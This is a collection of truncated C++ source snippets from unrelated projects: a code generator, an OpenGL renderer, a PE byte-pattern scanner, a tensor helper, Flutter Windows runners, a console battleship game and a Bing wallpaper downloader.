    "#include \"cppmagic/MagicModeBase.h\"\n\n#include \"cppmagic/TagUtility.h\"\n\n////////////////////////////////////////////////////////////////////////\n\ncmg::MagicModeBase::MagicModeBase(const cmg::Settings& settings, const cmgSP<cmg::TagManager>& tagManager)\n    : mTagManager(tagManager), mSettings(settings)\n{\n    for (auto sortingMethod : cmg::sortingMethods())\n    {\n        auto comparator = cmg::getComparator(cmg::sortingStrToEnum(sortingMethod));\n        mComparatorMap[sortingMethod] = comparator;\n    }\n    mActiveComparator = cmg::getComparator(mSettings.mSortingMethod);\n}\n\n////////////////////////////////////////////////////////////////////////\n\nvoid cmg::MagicModeBase::tagManager(const cmgSP<cmg::TagManager>& tagManager)\n{\n    mTagManager = tagManager;\n}\n\n////////////////////////////////////////////////////////////////////////\n\nbool cmg::MagicModeBase::run(const cmgVector<std::pair<FilePath, FilePath>>& filePairs)\n{\n\n    if (mTagManager == nullptr)\n    {\n        LOG_ERROR(\"Tag Manager is not set. Please use the 'tagManager' function to set the tag manager.\");\n        return false;\n    }\n    for (auto& [headerFile, sourceFile] : filePairs)\n    {\n        const auto& tagPairs = mTagManager->getTagPairs(headerFile.relativePathStem());\n\n        preProcessTags(tagPairs);\n        auto protoImplPairs = setupProtoImplPairs(tagPairs);\n\n        cmgVector<std::string> nonTargetLines;\n        runImpl(nonTargetLines, protoImplPairs, headerFile, sourceFile);\n        writeCode(nonTargetLines, protoImplPairs, headerFile, sourceFile);\n    }\n    return true;\n}\n\n////////////////////////////////////////////////////////////////////////\n\nvoid cmg::MagicModeBase::registerComparator(const std::string& name, MagicComparator& comparator)\n{\n    mComparatorMap.try_emplace(name, comparator);\n}\n\n////////////////////////////////////////////////////////////////////////\n\nvoid cmg::MagicModeBase::preProcessTags(const std::pair<cmgSPVector<cmg::TagInfo>, cmgSPVector<cmg::TagInfo>>& tagPairs)\n{\n}\n\n////////////////////////////////////////////////////////////////////////\n\nvoid cmg::MagicModeBase::setupParameters(const cmgSPVector<cmg::TagInfo>& tags, const cmg::FileCategory& fileCategory)\n{\n    auto parameterTags = cmg::TagUtility::filter(tags, {cmg::TagKind::PARAMETER});\n\n    cmgVector<cmg::TagKind> filter;\n    switch (fileCategory)\n    {\n    case cmg::FileCategory::Header:\n        filter = {cmg::TagKind::PROTOTYPE};\n        break;\n    case cmg::FileCategory::Source:\n        filter = {cmg::TagKind::FUNCTION};\n        break;\n    default:\n        return;\n    }\n\n    auto functionTags = cmg::TagUtility::filter(tags, filter);\n    std::sort(parameterTags.begin(), parameterTags.end(), cmg::TagInfoStartLineComparator());\n\n    for (const auto& tag : functionTags)\n    {\n        auto functionScopedName = tag->mScope + \"::\" + tag->mSymbolName;\n        for (const auto& parameterTag : parameterTags)\n        {\n            if (functionScopedName == parameterTag->mScope)\n            {\n                LOG_TRACE(\"Parameter: %s\", parameterTag->mSymbolName.c_str());\n                if ((parameterTag->mStartLine >= tag->mStartLine) && (parameterTag->mStartLine <= tag->mEndLine))\n                {\n                    tag->mParameters.push_back(parameterTag);\n                    LOG_TRACE(\"Adding parameter %s to function %s\", parameterTag->mSymbolName.c_str(), tag->mSymbolName.c_str());\n                }\n            }\n        }\n        tag->serializeParameters();\n    }\n}\n\n////////////////////////////////////////////////////////////////////////\n\nvoid cmg::MagicModeBase::loadCode(cmgVector<std::string>& nonTargetLines, cmgVector<cmg::ProtoImplTagPair>& protoImplPairs, const FilePath& headerFile, const FilePath& sourceFile)\n{\n    cmgVector<std::string> headerFileLines = cmg::utils::readLinesFromFile(headerFile.absolutePath());\n    cmgVector<std::string> sourceFileLines = cmg::utils::readLinesFromFile(sourceFile.absolutePath());\n\n    nonTargetLines.reserve(protoImplPairs.size() + 2);\n    nonTargetLines.push_back(\"\");\n\n    int currentIndex = 0;\n    bool isFirst = true;\n    // Load functions and nonTargetLines.\n    for (auto protoImplPair : protoImplPairs)\n    {\n        const auto& prototype = protoImplPair.mPrototype;\n        auto& impl = protoImplPair.mImplementation;\n        auto startIndex = impl->mStartLine - 1;\n        auto endIndex = impl->mEndLine - 1;\n        if (startIndex < 0)\n        {\n            nonTargetLines.push_back(mSettings.mFunctionSpacer);\n            continue;\n        }\n        std::ostringstream target;\n        std::ostringstream nonTarget;\n\n        while (currentIndex < startIndex && currentIndex < sourceFileLines.size())\n            nonTarget << sourceFileLines[currentIndex++] << \"\\n\";\n\n        if (isFirst)\n        {\n            nonTargetLines.insert(nonTargetLines.begin(), nonTarget.str());\n            isFirst = false;\n        }\n        else\n            nonTargetLines.push_back(nonTarget.str());\n\n        while (currentIndex <= endIndex && currentI",
    "#include <glad/glad.h>\n#include <GLFW/glfw3.h>\n\n#include <glm/glm.hpp>\n#include <glm/gtc/matrix_transform.hpp>\n#include <glm/gtc/type_ptr.hpp>\n\n#include <opengl/shader.hpp>\n#include <opengl/camera.hpp>\n#include <opengl/model.hpp>\n#include <opengl/light.hpp>\n\n#include <iostream>\n\nvoid framebuffer_size_callback(GLFWwindow* window, int width, int height);\nvoid mouse_callback(GLFWwindow* window, double xpos, double ypos);\nvoid scroll_callback(GLFWwindow* window, double xoffset, double yoffset);\nvoid processInput(GLFWwindow *window);\n\n// settings\nconst unsigned int SCR_WIDTH = 800;\nconst unsigned int SCR_HEIGHT = 600;\n\n// camera\nCamera camera(glm::vec3(0.0f, 0.0f, 3.0f));\nfloat lastX = SCR_WIDTH / 2.0f;\nfloat lastY = SCR_HEIGHT / 2.0f;\nbool firstMouse = true;\n\n// timing\nfloat deltaTime = 0.0f;\nfloat lastFrame = 0.0f;\n\nint main()\n{\n    // glfw: initialize and configure\n    // ------------------------------\n    glfwInit();\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n\n#ifdef __APPLE__\n    glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);\n#endif\n\n    // glfw window creation\n    // --------------------\n    GLFWwindow* window = glfwCreateWindow(SCR_WIDTH, SCR_HEIGHT, \"LearnOpenGL\", NULL, NULL);\n    if (window == NULL)\n    {\n        std::cout << \"Failed to create GLFW window\" << std::endl;\n        glfwTerminate();\n        return -1;\n    }\n    glfwMakeContextCurrent(window);\n    glfwSetFramebufferSizeCallback(window, framebuffer_size_callback);\n    glfwSetCursorPosCallback(window, mouse_callback);\n    glfwSetScrollCallback(window, scroll_callback);\n\n    // tell GLFW to capture our mouse\n    glfwSetInputMode(window, GLFW_CURSOR, GLFW_CURSOR_DISABLED);\n\n    // glad: load all OpenGL function pointers\n    // ---------------------------------------\n    if (!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress))\n    {\n        std::cout << \"Failed to initialize GLAD\" << std::endl;\n        return -1;\n    }\n\n    // tell stb_image.h to flip loaded texture's on the y-axis (before loading model).\n    stbi_set_flip_vertically_on_load(true);\n\n    // configure global opengl state\n    // -----------------------------\n    glEnable(GL_DEPTH_TEST);\n\n    // build and compile shaders\n    // -------------------------\n    Shader ourShader(\"../resources/shaders/model_lighting.vs\", \"../resources/shaders/model_lighting.fs\");\n\n    // load models\n    // -----------\n    Model ourModel(\"../resources/models/bunny.obj\", false);\n\n    // generate a light source\n    LightManager ourLightManager;\n    ourLightManager.addPointLight(glm::vec3(2.0f, 0.0f, 2.0f), glm::vec3(1.0f, 0.0f, 0.0f), 1.0f);\n    ourLightManager.addSpotLight(glm::vec3(0.0f, 0.0f, 3.0f), glm::vec3(0.0f, 0.0f, -1.0f), glm::vec3(1.0f, 1.0f, 1.0f), 0.6f, 5.0f, 15.0f);\n    \n    // draw in wireframe\n    //glPolygonMode(GL_FRONT_AND_BACK, GL_LINE);\n\n    // render loop\n    // -----------\n    while (!glfwWindowShouldClose(window))\n    {\n        // per-frame time logic\n        // --------------------\n        float currentFrame = static_cast<float>(glfwGetTime());\n        deltaTime = currentFrame - lastFrame;\n        lastFrame = currentFrame;\n\n        // input\n        // -----\n        processInput(window);\n\n        // render\n        // ------\n        glClearColor(0.05f, 0.05f, 0.05f, 1.0f);\n        glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n\n        // don't forget to enable shader before setting uniforms\n        ourShader.use();\n\n        // view/projection transformations\n        glm::mat4 projection = glm::perspective(glm::radians(camera.Zoom), (float)SCR_WIDTH / (float)SCR_HEIGHT, 0.1f, 100.0f);\n        glm::mat4 view = camera.GetViewMatrix();\n        ourShader.setMat4(\"projection\", projection);\n        ourShader.setMat4(\"view\", view);\n\n        // model transformation\n        glm::mat4 model = glm::mat4(1.0f);\n        model = glm::translate(model, glm::vec3(0.0f, -0.3f, 0.0f)); // translate it down so it's at the center of the scene\n        model = glm::scale(model, glm::vec3(5.0f, 5.0f, 5.0f));\t// it's a bit too big for our scene, so scale it down\n        ourShader.setMat4(\"model\", model);\n\n        // set camera position\n        ourShader.setVec3(\"cameraPos\", camera.Position);\n\n        // apply light to shader\n        ourLightManager.Apply(ourShader);\n\n        // render the model\n        ourModel.Draw(ourShader);\n\n\n        // glfw: swap buffers and poll IO events (keys pressed/released, mouse moved etc.)\n        // -------------------------------------------------------------------------------\n        glfwSwapBuffers(window);\n        glfwPollEvents();\n    }\n\n    // glfw: terminate, clearing all previously allocated GLFW resources.\n    // ------------------------------------------------------------------\n    glfwTerminate();\n    return 0;\n}\n\n// process all input: query GLFW whether relevant keys are pressed/released this frame and react accordingly\n// ------------",
    "#include \"Utils.h\"\r\n\r\nBOOL PatternCheck(PCSTR data, PCSTR pattern, PCSTR mask) {\r\n    \r\n    auto len = strlen(mask);\r\n\r\n    for (auto i = 0ui64; i < len; i++)  {\r\n\r\n        if (data[i] == pattern[i] || mask[i] == '?') continue; else return FALSE;\r\n    }\r\n    return TRUE;\r\n}\r\n\r\nUINT64 FindPattern(UINT64 address, UINT64 size, PCSTR pattern, PCSTR mask) {\r\n\r\n    size -= strlen(mask);\r\n\r\n    for (auto i = 0ui64; i < size; i++) if (PatternCheck((PCSTR)address + i, pattern, mask)) return address + i;\r\n\r\n    return 0;\r\n}\r\n\r\nUINT64 FindPatternImage(UINT64 ImageBase, PCSTR Pattern, PCSTR Mask) {\r\n\r\n    auto DosHeader = (IMAGE_DOS_HEADER*)ImageBase;\r\n\r\n    auto NtHeaders = (PIMAGE_NT_HEADERS64)(ImageBase + DosHeader->e_lfanew);\r\n\r\n    auto Section = IMAGE_FIRST_SECTION(NtHeaders);\r\n\r\n    for (auto i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++) {\r\n\r\n        if (!strcmp((PCSTR)Section[i].Name, \".text\")) {\r\n\r\n            return FindPattern(ImageBase + Section[i].VirtualAddress, Section[i].Misc.VirtualSize, Pattern, Mask);\r\n        }\r\n    }\r\n    return 0;\r\n}",
    "#include <bits/stdc++.h>\n\nusing namespace std;\n\ntypedef struct index {\n\tint left = -1;\n\tint right = -1; // non-inclusive\n\tint step = 1;\n\n\tbool isAll(){\n\t\treturn left == -1 && right == -1;\n\t}\n\n\tbool isPref(){\n\t\treturn left == -1;\n\t}\n\n\tbool isSuff(){\n\t\treturn right == -1;\n\t}\n\n\tint len(int max_len){\n\t\tif(isAll()) return max_len;\n\t\tif(isPref()) return right;\n\t\tif(isSuff()) return max_len - left + 1;\n\n\t\treturn right - left;\n\t}\n} Index;\n\nvector<string> split_string(const string& s, const string& delimiter) {\n    vector<string> tokens;\n    size_t start = 0;\n    size_t end = s.find(delimiter);\n    \n    while (end != string::npos) {\n        tokens.push_back(s.substr(start, end - start));\n        start = end + delimiter.length();\n        end = s.find(delimiter, start);\n    }\n    \n    // Add the last token\n    tokens.push_back(s.substr(start));\n\n    return tokens;\n}\n\ntypedef struct tensor {\n\tvector<int> dimensions;\n\tvector<int> data;\n\tmap<int,int> transform; // to convert new dims to old dims\n\tbool rearranged = false;\n\n\t// a b c d->b a d c\n\t// TODO: expand it to do some regex stuff,\n\t// \t where all the dims need not be specified.\n\tvoid rearrange(string s){\n\t\tif(!rearranged){\n\t\t\trearranged = true;\n\t\t\tfor(int i = 0; i < dimensions.size(); i++)\n\t\t\t\ttransform[i] = i;\n\t\t}\n\n\t\tvector<string> input_output = split_string(s, \"->\");\n\t\tstring from = input_output[0];\n\t\tstring to = input_output[1];\n\t\t\n\t\t// TODO: trim the dim strings\n\t\tvector<string> from_dims = split_string(from, \" \");\n\t\tvector<string> to_dims = split_string(to, \" \");\n\t\tassert(from_dims.size() == to_dims.size());\n\t\tassert(from_dims.size() == dimensions.size());\n\n\t\t// Initialize to it's own dimension \n\t\t// if not already assigned to something else.\n\t\t/* for(int i = 0; i < dimensions.size(); i++){\n\t\t\tif(transform[i] == 0)\n\t\t\t\ttransform[i] = i;\n\t\t} */\n\n\t\tmap<string, int> input_to_idx;\n\t\tfor(int i = 0; i < from_dims.size(); i++){\n\t\t\tinput_to_idx[from_dims[i]] = i;\n\t\t}\n\t\tauto old_transform = transform;\n\t\tfor(int i = 0; i < to_dims.size(); i++){\n\t\t\ttransform[i] = old_transform[input_to_idx[to_dims[i]]]; // new_dim to old_dim\n\t\t}\n\t}\n\n\tvector<int> toNdIdx(int idx){\n\t\tvector<int> idxs;\n\t\t/// why reverse?\n\t\tfor(int i = dimensions.size() - 1; i>=0; i--){\n\t\t\tidxs.push_back(idx%dimensions[i]);\n\t\t\tidx /= dimensions[i];\n\t\t}\n\n\t\treverse(idxs.begin(), idxs.end());\n\t\treturn idxs;\n\t}\n\n\t/// Need to rewrite this, so that we can do stuff like a[0,:,1]\n\t/// where we take all of an intermediate dim\n\t//\n\t// Lets loop over each element and see if it fits the indexing\n\n\tstruct tensor operator[](vector<Index> new_idxs){\n\t\tassert(new_idxs.size() <= dimensions.size());\n\n\t\tvector<Index> idxs(dimensions.size()); // to original dimensions\n\t\tif(rearranged){\n\t\t\tfor(int i = 0; i < new_idxs.size(); i++){\n\t\t\t\tidxs[transform[i]] = new_idxs[i];\n\t\t\t}\n\t\t}\n\t\telse\n\t\t\tidxs = new_idxs;\n\t\tstruct tensor result;\n\t\t// what would be the output dim?\n\t\tfor(int i = 0; i < dimensions.size(); i++){\n\t\t\tif(i < idxs.size()){\n\t\t\t\tresult.dimensions.push_back(idxs[i].len(dimensions[i]));\n\t\t\t}\n\t\t\telse\n\t\t\t\tresult.dimensions.push_back(dimensions[i]);\n\t\t}\n\n\t\tfor(int i = 0; i < data.size(); i++){\n\t\t\t/// Check for each data[i] if it belongs to the set of idxs\n\t\t\t/// 1 2 3 4 5 6 7 8 , 2 x 4\n\t\t\t/// _______ _______\n\t\t\t/// _ _ _ _ _ _ _ _\n\t\t\t//\n\t\t\t// 1 2 3 4 5 6\n\t\t\t// _____ _____\n\t\t\t// _ _ _ _ _ _\n\t\t\t\n\t\t\tbool ok = true;\n\t\t\tint curr_size = data.size();\n\t\t\tint left = 0, right = data.size() - 1;\n\t\t\tvector<int> p_idxs = toNdIdx(i);\n\t\t//\tfor(auto x : p_idxs)cout<<x<<\" \";cout<<endl;\n\t\t\tfor(int j = 0; j < idxs.size(); j++){\n\t\t\t\tif(idxs[j].isAll())continue;\n\t\t\t\tif(idxs[j].isPref()){\n\t\t\t\t\tok &= (idxs[j].right > p_idxs[j]);\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\tif(idxs[j].isSuff()){\n\t\t\t\t\tok &= (idxs[j].left <= p_idxs[j]);\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\tok &= (idxs[j].left <= p_idxs[j] && p_idxs[j] < idxs[j].right);\n\t\t\t}\n\t\t\tif(ok)result.data.push_back(data[i]);\n\t//\t\tif(ok) cout<<i<<endl;\n\t\t}\n\t//\tcout<<\"data_sie:\"<<result.data.size()<<endl;\n\t\t\n\t\treturn result;\n\t}\n\n\t/// Gets rid of dimensions with only one value\n\tstruct tensor shrink(){\n\t\tstruct tensor new_tensor;\n\t\tfor(auto dim : dimensions){\n\t\t\tif(dim != 1)\n\t\t\t\tnew_tensor.dimensions.push_back(dim);\n\t\t}\n\t\tif(new_tensor.dimensions.size() == 0)\n\t\t\tnew_tensor.dimensions.push_back(1);\n\t\tnew_tensor.data = data;\n\t\treturn new_tensor;\n\t}\n\n\tvoid print_dim(ostream& os, int dim_idx, int data_idx, int curr_size){\n\t\tif(dim_idx != dimensions.size() - 1){\n\t\t\tos << \"[\\n\";\n\t\t\tint block_size = curr_size / dimensions[dim_idx];\n\t\t\tfor(int i = 0; i < dimensions[dim_idx]; i++){\n\t\t\t\tprint_dim(os, dim_idx + 1,data_idx + i * (block_size), block_size);\n\t\t\t\tos << \", \\n\";\n\t\t\t}\n\t\t\tos << \"]\\n\";\n\t\t\treturn;\n\t\t}\n\t\tos << \"[\";\n\t\tfor(int i = 0; i < dimensions[dim_idx]; i++){\n\t\t\tos << data[data_idx + i] << \", \";\n\t\t}\n\t\tos << \"]\";\n\t}\n\n\t\n\tfriend ostream& operator<<(ostream& os, struct tensor& t);\n} Tensor;\n\nostream& operator<<(ostream& os, struct tensor& t){\n\tos << \"dimensions: (\";\n\tfor(auto dim : t.dimensions){\n\t\tos << dim << \", \";\n\t}\n\tos << \")\\n\";\n\n\tos <",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"cw1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"UI.h\"\r\n\r\nvoid Create(NOD *&list, int &i) {\r\n\tifstream in(\"Leaderboard.txt\");\r\n\tlist = new (nothrow) NOD[30];\r\n\tif (list == nullptr) {\r\n\t\tcout << \"Alocare esuata\" << endl;\r\n\t\texit(1);\r\n\t}\r\n\tchar line[30];\r\n\ti = 0;\r\n\twhile (in.getline(line, 30)) {\r\n\t\tchar* name, * nxt;\r\n\t\tint w, l, d;\r\n\t\tchar* p = strtok_s(line, \",\", &nxt);\r\n\t\tname = p;\r\n\t\tp = strtok_s(nullptr, \",\", &nxt);\r\n\t\tw = atoi(p);\r\n\t\tp = strtok_s(nullptr, \",\", &nxt);\r\n\t\tl = atoi(p);\r\n\t\tp = strtok_s(nullptr, \",\", &nxt);\r\n\t\td = atoi(p);\r\n\t\tPlayer player(name, w, l, d);\r\n\t\tlist[i].info.operator=(player);\r\n\t\ti++;\r\n\t}\r\n\tin.close();\r\n}\r\n\r\nvoid Sort(NOD* &list, int total) {\r\n\tint s = 0; \r\n\twhile (s == 0) {\r\n\t\ts = 1;\r\n\t\tfor (int i = 0; i < total - 1; i++) {\r\n\t\t\tif (list[i].info.operator<(list[i + 1].info)) {\r\n\t\t\t\tPlayer aux;\r\n\t\t\t\taux.operator=(list[i].info);\r\n\t\t\t\tlist[i].info.operator=(list[i + 1].info);\r\n\t\t\t\tlist[i + 1].info.operator=(aux);\r\n\t\t\t\ts = 0;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid InFile(NOD* list, int total) {\r\n\tofstream out(\"Leaderboard.txt\");\r\n\tfor (int i = 0; i < total; i++) {\r\n\t\tout << list[i].info;\r\n\t}\r\n\tout.close();\r\n}\r\n\r\nvoid Search(NOD* list, int total, Player& player, int &index) {\r\n\tfor (int i = 0; i < total; i++) {\r\n\t\tchar* l, * p;\r\n\t\tbool ok = true;\r\n\t\tl = list[i].info.getName();\r\n\t\tp = player.getName();\r\n\t\twhile (*l == *p) {\r\n\t\t\tif (*l == '\\0')\r\n\t\t\t\tok = false;\r\n\t\t\tl++;\r\n\t\t\tp++;\r\n\t\t}\r\n\t\tif (ok == false) {\r\n\t\t\tplayer.operator=(list[i].info);\r\n\t\t\tindex = i;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n}\r\n\r\nint main() {\r\n\tNOD* list;\r\n\tint total;\r\n\tCreate(list, total);\r\n\tUI game;\r\n\tint gamemode;\r\n\tdo {\r\n\t\tgamemode = game.mainMenu();\r\n\t\tif (gamemode == 1) {\r\n\t\t\tPlayer player1, player2;\r\n\t\t\tint p1index = -1, p2index = -1;\r\n\t\t\tgame.PlayerVSPlayer(player1, player2);\r\n\t\t\tSearch(list, total, player1, p1index);\r\n\t\t\tSearch(list, total, player2, p2index);\r\n\t\t\tplayer1.setBoard(player1.board);\r\n\t\t\tsystem(\"pause\");\r\n\t\t\tsystem(\"cls\");\r\n\t\t\tplayer2.setBoard(player2.board);\r\n\t\t\twhile (game.Win(player1, player2) == false) {\r\n\t\t\t\tint x, y;\r\n\t\t\t\tcout << \"Waiting for \" << player1.getName() << endl;\r\n\t\t\t\tsystem(\"pause\");\r\n\t\t\t\tsystem(\"cls\");\r\n\t\t\t\tgame.InGameBoard(player1);\r\n\t\t\t\tplayer1.playGuess(x, y);\r\n\t\t\t\tgame.updBoard(player1, player2, x, y - 1);\r\n\t\t\t\tcout << \"Waiting for \" << player2.getName() << endl;\r\n\t\t\t\tsystem(\"pause\");\r\n\t\t\t\tsystem(\"cls\");\r\n\t\t\t\tgame.InGameBoard(player2);\r\n\t\t\t\tplayer2.playGuess(x, y);\r\n\t\t\t\tgame.updBoard(player2, player1, x, y - 1);\r\n\t\t\t}\r\n\t\t\tgame.Decision(player1, player2);\r\n\t\t\tif (p1index != -1)\r\n\t\t\t\tlist[p1index].info.operator=(player1);\r\n\t\t\telse {\r\n\t\t\t\ttotal++;\r\n\t\t\t\tlist[total - 1].info.operator=(player1);\r\n\t\t\t}\r\n\t\t\tif (p2index != -1)\r\n\t\t\t\tlist[p2index].info.operator=(player2);\r\n\t\t\telse {\r\n\t\t\t\ttotal++;\r\n\t\t\t\tlist[total - 1].info.operator=(player2);\r\n\t\t\t}\r\n\t\t}\r\n\t\tif (gamemode == 2) {\r\n\t\t\tPlayer player, computer;\r\n\t\t\tint pindex = -1, comindex = -1;\r\n\t\t\tgame.PlayerVSComputer(player, computer, list, total);\r\n\t\t\tSearch(list, total, player, pindex);\r\n\t\t\tSearch(list, total, computer, comindex);\r\n\t\t\tcomputer.setBoard(computer.board);\r\n\t\t\tcout << \"Waiting for \" << player.getName() << endl;\r\n\t\t\tsystem(\"pause\");\r\n\t\t\tsystem(\"cls\");\r\n\t\t\tplayer.setBoard(player.board);\r\n\t\t\twhile (game.Win(player, computer) == false) {\r\n\t\t\t\tint x, y;\r\n\t\t\t\tgame.InGameBoard(player);\r\n\t\t\t\tplayer.playGuess(x, y);\r\n\t\t\t\tgame.updBoard(player, computer, x, y - 1);\r\n\t\t\t\tsystem(\"pause\");\r\n\t\t\t\tsystem(\"cls\");\r\n\t\t\t\tcomputer.compGuess(x, y);\r\n\t\t\t\tgame.updBoard(computer, player, x, y - 1);\r\n\t\t\t}\r\n\t\t\tgame.Decision(player, computer);\r\n\t\t\tif (pindex != -1)\r\n\t\t\t\tlist[pindex].info.operator=(player);\r\n\t\t\telse {\r\n\t\t\t\ttotal++;\r\n\t\t\t\tlist[total - 1].info.operator=(player);\r\n\t\t\t}\r\n\t\t\tlist[comindex].info.operator=(computer);\r\n\t\t}\r\n\t\tif (gamemode == 3) {\r\n\t\t\tSort(list, total);\r\n\t\t\tcout << \"\\tLeaderboard\" << endl;\r\n\t\t\tfor (int i = 0; i < total; i++) {\r\n\t\t\t\tcout << i + 1 << \". \" << list[i].info.getName() << \"\\t\" << list[i].info.wins << \"w - \" << list[i].info.losses << \"l - \" << list[i].info.draws << \"d\" << endl;\r\n\t\t\t}\r\n\t\t\tsystem(\"pause\");\r\n\t\t\tsystem(\"cls\");\r\n\t\t}\r\n\t\tInFile(list, total);\r\n\t\tsystem(\"cls\");\r\n\t} while (gamemode != 4);\r\n\treturn 0;\r\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"parkquest_parkir_gamifikasi\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <boost/beast/core/flat_buffer.hpp>\n#include <boost/beast/core/tcp_stream.hpp>\n#include <boost/beast/http/empty_body.hpp>\n#include <boost/beast/http/message.hpp>\n#include <boost/beast/http/read.hpp>\n#include <boost/beast/http/vector_body.hpp>\n#include <boost/beast/http/write.hpp>\n#include <boost/beast/ssl/ssl_stream.hpp>\n#include <boost/json/parse.hpp>\n#include <boost/url/url_view.hpp>\n#include <filesystem>\n#include <format>\n#include <fstream>\n#include <iostream>\n#include <vector>\n\nnamespace asio = boost::asio;\nnamespace urls = boost::urls;\nnamespace beast = boost::beast;\nnamespace json = boost::json;\n\n// clang-format off\nstatic constexpr std::string_view kApiUrlFormat = \"https://global.bing.com/HPImageArchive.aspx?format=js&idx=0&n=1&uhd=1&uhdwidth={}&uhdheight={}&setmkt={}&setlang={}\";\nstatic constexpr std::string_view kImgUrlFormat = \"https://cn.bing.com{}\";\n// clang-format on\n\ntemplate <class T = char>\nstd::vector<T> HttpGet(asio::io_context& ioc, asio::ssl::context& ctx,\n                       const urls::url_view& url) {\n  std::string port = \"443\";\n  if (url.has_port()) {\n    port = url.port();\n  }\n  auto host = url.host();\n  auto target = url.encoded_target().substr();\n  asio::ip::tcp::resolver resolver{ioc};\n  beast::ssl_stream<beast::tcp_stream> stream{ioc, ctx};\n  auto results = resolver.resolve(host, port);\n  beast::get_lowest_layer(stream).connect(results);\n  stream.handshake(asio::ssl::stream_base::client);\n  beast::http::request<beast::http::empty_body> req{beast::http::verb::get,\n                                                    target, 11};\n  req.set(beast::http::field::host, host);\n  beast::http::write(stream, req);\n  beast::flat_buffer buffer;\n  beast::http::response<beast::http::vector_body<T>> res;\n  beast::http::read(stream, buffer, res);\n  return std::move(res.body());\n}\n\nstruct ScreenResolution {\n  std::int32_t width = 0;\n  std::int32_t height = 0;\n};\n\nScreenResolution GetScreenResolution() noexcept {\n  std::int32_t width = GetSystemMetrics(SM_CXSCREEN);\n  std::int32_t height = GetSystemMetrics(SM_CYSCREEN);\n  return {.width = width, .height = height};\n}\n\nstd::vector<char> DownloadImage(asio::io_context& ioc, asio::ssl::context& ctx,\n                                ScreenResolution resolution,\n                                std::string_view lcid) {\n  auto url = std::format(kApiUrlFormat, resolution.width, resolution.height,\n                         lcid, lcid);\n  std::cout << \"GET \" << url << std::endl;\n  auto js = HttpGet(ioc, ctx, url);\n  auto jv = json::parse({js.data(), js.size()});\n  auto img_path = jv.at(\"images\").as_array().at(0).at(\"url\").as_string();\n  auto img_url = std::format(kImgUrlFormat, img_path.c_str());\n  std::cout << \"GET \" << img_url << std::endl;\n  return HttpGet(ioc, ctx, img_url);\n}\n\nstd::filesystem::path SaveImage(const std::vector<char>& data) {\n  auto img_path = std::filesystem::current_path();\n  if (!std::filesystem::exists(img_path)) {\n    std::filesystem::create_directories(img_path);\n  }\n  img_path.append(\"BingWallpaper.jpg\");\n  std::cout << \"SAVE \" << img_path << std::endl;\n  std::ofstream file(img_path, std::ios_base::out | std::ios_base::binary);\n  if (!file.is_open()) {\n    throw std::runtime_error(\"Cannot open file: \" + img_path.string());\n  }\n  file.write(data.data(), data.size());\n  file.close();\n  return img_path;\n}\n\nvoid SetDesktopWallpaper(const std::filesystem::path& img_path) {\n  std::cout << \"SET \" << img_path << std::endl;\n  bool status = SystemParametersInfo(\n      SPI_SETDESKWALLPAPER, 0, (PVOID)img_path.c_str(), SPIF_UPDATEINIFILE);\n  if (!status) {\n    throw std::runtime_error(\"Set desktop wallpaper failed: \" +\n                             std::to_string(GetLastError()));\n  }\n}\n\nint main(int argc, char* argv[]) {\n  std::string lcid = \"en-US\";\n  if (argc > 1) {\n    lcid = argv[1];\n  }\n\n  